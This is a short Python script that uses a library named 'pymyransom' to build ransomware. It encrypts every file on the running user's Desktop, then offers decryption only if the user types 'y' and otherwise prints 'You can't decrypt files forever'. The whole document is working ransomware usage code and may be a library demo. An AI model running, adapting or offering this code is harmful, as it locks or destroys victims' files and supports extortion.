import pymyransom
ransom1 = pymyransom.makeMyRansomware(".Example")
ransom1.Encryptor("c:/Users/"+ransom1.username+"/Desktop/**")
answer = input("Do you want to decrypt? (y/n)")
if answer == 'y':
    ransom1.Decryptor("c:/Users/"+ransom1.username+"/Desktop/**")
else:
    input("You can't decrypt files forever . . .")